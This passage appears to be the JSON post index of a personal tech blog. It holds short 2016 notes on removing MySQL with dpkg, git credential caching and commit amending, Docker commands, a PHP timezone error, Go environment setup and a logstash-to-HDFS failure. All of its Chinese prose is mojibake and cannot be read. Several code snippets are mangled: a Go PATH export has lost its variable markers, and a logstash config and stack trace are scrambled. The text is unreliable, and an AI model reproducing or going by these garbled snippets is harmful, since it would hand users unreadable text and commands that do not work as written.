ç‰¹ç½‘ä¸Šï¼Œä½œä¸ºåŸŸåç³»ç»ŸæœåŠ¡å™¨çš„æœºå™¨çš„æ€§èƒ½ç»å¸¸ç”¨æ¯ç§’æŸ¥è¯¢ç‡æ¥è¡¡é‡ã€‚å¯¹åº”fetches/secï¼Œå³æ¯ç§’çš„å“åº”è¯·æ±‚æ•°ï¼Œä¹Ÿå³æ˜¯æœ€å¤§ååèƒ½åŠ›ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"å½»åº•åˆ é™¤mysql","slug":"history/tech/5953c4d0c2b92f5665eeda65","date":"2016-09-28T02:18:19.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda65/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda65/","excerpt":"","text":"å½»åº•åˆ é™¤mysql: sudo dpkg -P `sudo dpkg -l | grep mysql | awk '{print $2}'`","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"ä»€ä¹ˆæ˜¯ æ’®åˆç³»ç»Ÿ","slug":"history/tech/5953c4d0c2b92f5665eeda64","date":"2016-09-27T03:14:45.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda64/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda64/","excerpt":"","text":"ä»€ä¹ˆæ˜¯æ’®åˆç³»ç»Ÿ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"default","slug":"default","permalink":"https://wangxiuwen.github.io/tags/default/"}],"author":"wangxiuwen"},{"title":"è§„åˆ™å¼•æ“","slug":"history/tech/5953c4d0c2b92f5665eeda63","date":"2016-09-27T03:13:58.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda63/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda63/","excerpt":"","text":"drools","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"default","slug":"default","permalink":"https://wangxiuwen.github.io/tags/default/"}],"author":"wangxiuwen"},{"title":"git æ¸…ç†ä¿å­˜ https ç”¨æˆ·åå¯†ç ","slug":"history/tech/5953c73311a1d5578f3f9a68","date":"2016-09-26T01:45:50.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a68/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a68/","excerpt":"","text":"æ¸…ç†å¯†ç ï¼š[quote]git config --global credential.helper clean[/quote]è®¾ç½®è®°ä½å¯†ç ï¼ˆé»˜è®¤15åˆ†é’Ÿï¼‰ï¼š[quote]git config --global credential.helper cache[/quote]å¦‚æœæƒ³è‡ªå·±è®¾ç½®æ—¶é—´ï¼Œå¯ä»¥è¿™æ ·åšï¼š[quote]git config credential.helper â€˜cache --timeout=3600â€™ //è¿™æ ·å°±è®¾ç½®ä¸€ä¸ªå°æ—¶ä¹‹åå¤±æ•ˆ[/quote]é•¿æœŸå­˜å‚¨å¯†ç ï¼š[quote]git config --global credential.helper store[/quote]å¢åŠ è¿œç¨‹åœ°å€çš„æ—¶å€™å¸¦ä¸Šå¯†ç ä¹Ÿæ˜¯å¯ä»¥çš„:[quote][url]http://yourname:password@github.com/name/project.git[/url] è¡¥å……ï¼šä½¿ç”¨å®¢æˆ·ç«¯ä¹Ÿå¯ä»¥å­˜å‚¨å¯†ç çš„ã€‚[/quote]å¦‚æœä½ æ­£åœ¨ä½¿ç”¨sshè€Œä¸”æƒ³ä½“éªŒhttpså¸¦æ¥çš„é«˜é€Ÿï¼Œé‚£ä¹ˆä½ å¯ä»¥è¿™æ ·åšï¼šåˆ‡æ¢åˆ°é¡¹ç›®ç›®å½•ä¸‹,ç§»é™¤è¿œç¨‹sshæ–¹å¼çš„ä»“åº“åœ°å€ï¼š[quote]git remote rm origin[/quote]å¢åŠ httpsè¿œç¨‹ä»“åº“åœ°å€[quote]git remote add origin http://yourname:password@github.com/name/project.git[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"ä¿®æ”¹å·²ç»git commitçš„æ³¨é‡Šä¿¡æ¯","slug":"history/tech/5953c4d0c2b92f5665eeda62","date":"2016-07-28T03:45:14.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda62/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda62/","excerpt":"","text":"è¿™ä¸ªåº”è¯¥å¾ˆå¤šäººéƒ½éœ€è¦git commit -m â€˜xxxxxâ€™ä¹‹åçªç„¶è§‰å¾—æ³¨é‡Šä¿¡æ¯ä¸å¤ªå¥½ï¼Œæƒ³ä¿®æ”¹é‚£ä¹ˆæ‰§è¡Œ git commit --amend ä¿®æ”¹æœ€åä¸€æ¬¡æäº¤çš„ä¿¡æ¯å¦‚æœä½ å¯¹nanoä¸æ„Ÿå†’çš„è¯ï¼Œgit config --global core.editor vimå¦‚æœä¸å¹¸æŠŠä¸æ­£ç¡®çš„æ³¨é‡Šgit pushåˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œé‚£å°± æ‰§è¡Œ â€˜git push origin +master:masterâ€™ å¼ºåˆ¶æ›´æ–°","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"mac pycharm æ­å»º spark å¼€å‘ç¯å¢ƒ","slug":"history/tech/5953c4d0c2b92f5665eeda61","date":"2016-07-27T18:46:30.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda61/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda61/","excerpt":"","text":"å®‰è£…pycharmå®‰è£…py4j[code]pip install py4j[/code]é…ç½®ç¯å¢ƒå˜é‡[quote]&quot;Run&quot; -&gt;&quot;Edit Configurations&quot; -&gt; &quot;Environment variables&quot;SPARK_HOME /usr/local/sparkPYTHONPATH /usr/local/spark/python[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"spark","slug":"spark","permalink":"https://wangxiuwen.github.io/tags/spark/"}],"author":"wangxiuwen"},{"title":"php new DateTime($dtStr); æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda60","date":"2016-07-23T22:17:44.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda60/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda60/","excerpt":"","text":"[code]PHP Warning: date(): It is not safe to rely on the systemâ€™s timezone settings. You are required to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone â€˜UTCâ€™ for now, but please set date.timezone to select your timezone. in /var/www/blog/get.php on line 3PHP Fatal error: Uncaught exception â€˜Exceptionâ€™ with message â€˜DateTime::__construct(): It is not safe to rely on the systemâ€™s timezone settings. You are required to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone â€˜UTCâ€™ for now, but please set date.timezone to select your timezone.â€™ in /var/www/blog/get.php:4Stack trace:[/code]è§£å†³æ–¹æ¡ˆï¼šä»£ç å‰é¢æ’å…¥ä¸€è¡Œï¼š[code]date_default_timezone_set(â€˜PRCâ€™);[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"php","slug":"php","permalink":"https://wangxiuwen.github.io/tags/php/"}],"author":"wangxiuwen"},{"title":"docker exec","slug":"history/tech/5953c4d0c2b92f5665eeda5f","date":"2016-07-18T03:35:54.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda5f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda5f/","excerpt":"","text":"[code]docker exec -it nodejs /bin/sh[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"docker compose å®‰è£…","slug":"history/tech/5953c4d0c2b92f5665eeda5e","date":"2016-07-14T19:48:57.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda5e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda5e/","excerpt":"","text":"[code]apt-get install python-pip python-devpip install -U docker-composedocker-compose -version[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"Docker Dockerfile COPY vs ADD","slug":"history/tech/5953c4d0c2b92f5665eeda5d","date":"2016-07-14T04:32:16.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda5d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda5d/","excerpt":"","text":"ADD å¤šäº†2ä¸ªåŠŸèƒ½, ä¸‹è½½URLå’Œè§£å‹. å…¶ä»–éƒ½ä¸€æ ·.å¦‚æœä½ ä¸å¸Œæœ›å‹ç¼©æ–‡ä»¶æ‹·è´åˆ°containeråä¼šè¢«è§£å‹çš„è¯, é‚£ä¹ˆä½¿ç”¨COPY.å¦‚æœéœ€è¦è‡ªåŠ¨ä¸‹è½½URLå¹¶æ‹·è´åˆ°containerçš„è¯, è¯·ä½¿ç”¨ADD.","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"git httpsåè®®ç¼“å­˜åˆ é™¤","slug":"history/tech/5953c4d0c2b92f5665eeda5b","date":"2016-07-13T02:01:36.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda5b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda5b/","excerpt":"","text":"123git credential-osxkeychain erasehost=github.comprotocol=https","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"docker-compose","slug":"history/tech/5953c4d0c2b92f5665eeda5c","date":"2016-07-12T19:12:30.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda5c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda5c/","excerpt":"","text":"[code]pip install -U docker-compose -i http://pypi.douban.com/simple [/code][quote]-U æœ€æ–°ç‰ˆ-i ä½¿ç”¨è±†ç“£æº[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"docker","slug":"docker","permalink":"https://wangxiuwen.github.io/tags/docker/"}],"author":"wangxiuwen"},{"title":"IETester","slug":"history/tech/5953c4d0c2b92f5665eeda5a","date":"2016-07-11T19:49:28.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda5a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda5a/","excerpt":"","text":"[quote]http://www.my-debugbar.com/wiki/IETester/HomePage[/quote]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"front-end","slug":"front-end","permalink":"https://wangxiuwen.github.io/tags/front-end/"}],"author":"wangxiuwen"},{"title":".gitignoreæ–‡ä»¶ä¸èµ·ä½œç”¨","slug":"history/tech/5953c4d0c2b92f5665eeda57","date":"2016-06-29T04:31:11.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda57/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda57/","excerpt":"","text":"å½“æˆ‘ä»¬ç”¨gitæ—¶å¸¸å¸¸ä¼šä¹ æƒ¯æŠŠæˆ‘ä»¬ä¸æƒ³ä¸Šä¼ åˆ°è¿œç¨‹ä»£ç åº“ä¸­çš„ä¸€äº›æœ¬åœ°æ–‡ä»¶ï¼ˆå¤¹ï¼‰æ”¾åœ¨ä¸€ä¸ªå«åš.gitignoreçš„æ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚å¸¸è§çš„æœ¬åœ°buildæ–‡ä»¶å¤¹ï¼Œä¸€äº›IDEå¦‚Intellig,Eclipseçš„é¡¹ç›®ç®¡ç†æ–‡ä»¶ï¼Œä½†æœ‰äº›æ—¶å€™æˆ‘ä»¬ä¼šé‡åˆ°è¿™æ ·çš„é—®é¢˜ï¼šæ”¾å…¥gitignoreæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å´è¿˜æ˜¯è¢«git index, å½“ä½ é€šè¿‡git status æ˜¾ç¤ºæ–‡ä»¶çŠ¶æ€æ—¶ï¼Œä»–ä»¬å¹¶æ²¡æœ‰è¢«å¿½ç•¥ã€‚é—®é¢˜åœºæ™¯å½“ä½ åœ¨gitåº“ä¸­ç¼–å†™æŸäº›ä»£ç æ–‡ä»¶ï¼Œå¹¶å·²ç»stageè¯¥æ–‡ä»¶ä¹‹åï¼Œä½ å‘ç°æŸä¸ªæ–‡ä»¶ä½ ä¸æƒ³ç”¨äº†ï¼Œæƒ³åœ¨ä»¥åçš„æ”¹å˜ä¸­å¿½ç•¥å®ƒã€‚ç„¶åä½ å†ä½ çš„.gitignoreæ–‡ä»¶ä¸­åŠ å…¥è¯¥æ–‡ä»¶åï¼Œç»“æœå®ƒå¹¶æ²¡æœ‰è¢«å¿½ç•¥ã€‚å½“ä½ ä»è¿œç¨‹ä»£ç åº“ä¸­git cloneä¸€ä»½ä»£ç ä¸­æœ¬åœ°å¹¶åšäº›ä¿®æ”¹ï¼Œbuildï¼Œç„¶åé€šè¿‡git add .ç­‰stageäº†è¿™äº›æ”¹å˜ï¼Œå½“ä½ é€šè¿‡git statusæŸ¥çœ‹çŠ¶æ€æ—¶å‘ç°ä¸å°å¿ƒæŠŠbuild/æ–‡ä»¶å¤¹ç»™addè¿›æ¥äº†ã€‚äºæ˜¯ä½ åœ¨.gitignoreæ–‡ä»¶ä¸­åŠ å…¥äº†build/ï¼Œä½†å‘ç°å¹¶ä¸èµ·ä½œç”¨ã€‚æ ¹æœ¬åŸå› .gitignoreæ–‡ä»¶åªæ˜¯ignoreæ²¡æœ‰è¢«staged(cached)æ–‡ä»¶ï¼Œå¯¹äºå·²ç»è¢«stagedæ–‡ä»¶ï¼ŒåŠ å…¥ignoreæ–‡ä»¶æ—¶ä¸€å®šè¦å…ˆä»stagedç§»é™¤ã€‚ä¸‹é¢è¿™æ®µè¯æ¥è‡ªgithubï¼š .gitignoreæ–‡ä»¶ä¸å·¥ä½œ å› æ­¤ï¼Œè¦æƒ³ç”¨gitignoreå¿½ç•¥æ–‡ä»¶ï¼Œå¿…é¡»å…ˆæŠŠå®ƒä»¬ä»stagedä¸­ç§»é™¤ï¼š[code]git rm --cached file/path/to/be/ignored[/code]commitä½ å·²æœ‰çš„æ”¹å˜ï¼Œä¿å­˜å½“å‰çš„å·¥ä½œã€‚[code]git rm --cached file/path/to/be/ignoredgit add .git commit -m &quot;fixed untracked files&quot;[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"brew å®‰è£…  go ä¸¤ä¸ªç¯å¢ƒå˜é‡å¦‚ä½•é…ç½®","slug":"history/tech/5953c4d0c2b92f5665eeda59","date":"2016-06-28T20:41:30.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda59/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda59/","excerpt":"","text":"[code]GOROOT: goçš„å®‰è£…è·¯å¾„,å®˜æ–¹åŒ…è·¯å¾„æ ¹æ®è¿™ä¸ªè®¾ç½®è‡ªåŠ¨åŒ¹é…GOPATH: å·¥ä½œè·¯å¾„(å…¶å®ä¸åº”è¯¥ç”¨ä¸­æ–‡ç¿»è¯‘è§£é‡Šï¼Œç›´æ¥è¯´GOPATHæ›´åˆé€‚)[/code][code]export GOROOT=/usr/local/opt/go/libexecexport GOPATH=/Users/wangwilliam/Applications/Goexport PATH=GOROOT/bin:GOROOT/bin:GOROOT/bin:PATH[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"go","slug":"go","permalink":"https://wangxiuwen.github.io/tags/go/"}],"author":"wangxiuwen"},{"title":"mac æ·»åŠ sublime å‘½ä»¤è¡Œå¿«æ·é”®","slug":"history/tech/5953c4d0c2b92f5665eeda58","date":"2016-06-28T19:42:49.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda58/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda58/","excerpt":"","text":"[code]vim ~/.bash_profile[/code]æ·»åŠ ï¼š[code]alias subl=â€™â€™/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/sublâ€™â€™[/code]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mac","slug":"mac","permalink":"https://wangxiuwen.github.io/tags/mac/"}],"author":"wangxiuwen"},{"title":"git æäº¤æŠ¥é”™ src refspec master does not match any","slug":"history/tech/5953c4d0c2b92f5665eeda56","date":"2016-06-27T22:08:18.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda56/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda56/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯ï¼š[code]error: src refspec master does not match any[/code]åŸå› ï¼šæˆ‘åªæ˜¯æ·»åŠ äº†ç›®å½•ï¼Œæ²¡æœ‰æ–‡ä»¶å¯ä»¥æäº¤ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"logstash hadoop Failed to flush outgoing items AlreadyBeingCreatedException","slug":"history/tech/5953c4d0c2b92f5665eeda55","date":"2016-06-25T02:24:40.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda55/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda55/","excerpt":"","text":"logstash é…ç½®æ–‡ä»¶ï¼š[code]input {kafka {zk_connect =&gt; &quot;xxxxxxx:2181/kafka/xxx&quot;group_id =&gt; &quot;logstash_hadoop&quot;topic_id =&gt; &quot;log&quot;reset_beginning =&gt; trueconsumer_threads =&gt; 5decorate_events =&gt; truecodec =&gt; json}}filter {date {locale =&gt; &quot;en&quot;match =&gt; [&quot;timestamp&quot;, &quot;yyyy-MM-dd HH:mm:ss&quot;]}}webhdfs {use_httpfs =&gt; falseflush_size =&gt; 5idle_flush_time =&gt; 0.5workers =&gt; 1host =&gt; â€œxxx.xxx.xx.xâ€port =&gt; 50070user =&gt; â€œlogstashâ€path =&gt; â€œ/api/logs/dt=%{+YYYY-MM-dd}/logstash-%{+HH}.logâ€}[/code]é—®é¢˜ 1: Failed to flush outgoing items[code]{:timestamp=&gt;â€œ2016-06-25T09:26:37.151000+0800â€, :message=&gt;â€œFailed to flush outgoing itemsâ€, :outgoing_count=&gt;1, :exception=&gt;â€œWebHDFS::ServerErrorâ€, :backtrace=&gt;[&quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/webhdfs-0.8.0/lib/webhdfs/client_v1.rb:351:in request'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/webhdfs-0.8.0/lib/webhdfs/client_v1.rb:349:inrequestâ€™&quot;, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/webhdfs-0.8.0/lib/webhdfs/client_v1.rb:270:in operate_requests'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/webhdfs-0.8.0/lib/webhdfs/client_v1.rb:73:increateâ€™â€, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-output-webhdfs-2.0.4/lib/logstash/outputs/webhdfs.rb:210:in write_data'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-output-webhdfs-2.0.4/lib/logstash/outputs/webhdfs.rb:205:inwrite_dataâ€™â€, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-output-webhdfs-2.0.4/lib/logstash/outputs/webhdfs.rb:195:in flush'&amp;quot;, &amp;quot;org/jruby/RubyHash.java:1342:ineachâ€™â€, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-output-webhdfs-2.0.4/lib/logstash/outputs/webhdfs.rb:183:in flush'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/stud-0.0.22/lib/stud/buffer.rb:219:inbuffer_flushâ€™â€, â€œorg/jruby/RubyHash.java:1342:in each'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/stud-0.0.22/lib/stud/buffer.rb:216:inbuffer_flushâ€™â€, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/stud-0.0.22/lib/stud/buffer.rb:159:in buffer_receive'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-output-webhdfs-2.0.4/lib/logstash/outputs/webhdfs.rb:166:inreceiveâ€™â€, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-core-2.0.0-java/lib/logstash/outputs/base.rb:80:in handle'&amp;quot;, &amp;quot;(eval):409:inoutput_funcâ€™â€, â€œ/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-core-2.0.0-java/lib/logstash/pipeline.rb:252:in outputworker'&amp;quot;, &amp;quot;/usr/local/logstash-2.0.0/vendor/bundle/jruby/1.9/gems/logstash-core-2.0.0-java/lib/logstash/pipeline.rb:169:instart_outputsâ€™â€], :level=&gt;:warn}[/code]è§£å†³æ–¹æ¡ˆï¼šéœ€è¦åœ¨ logstash æ‰€åœ¨æœºå™¨ /etc/hosts é…ç½® hadoop æ‰€åœ¨æœºå™¨ï¼Œlogstash é…ç½®çš„ç”¨æˆ·è¦å¯¹ hdfs ç›®å½•æœ‰å†™æƒé™ (root ç”¨æˆ·åˆ™ä¸ç”¨ chown chgrp)[code]hdfs dfs -mkdir -p /api/logs/hdfs dfs -chown logstash /api/logs/hdfs dfs -chgrp logstash /api/logs/[/code]é—®é¢˜ 2: AlreadyBeingCreatedExceptionåŸå› 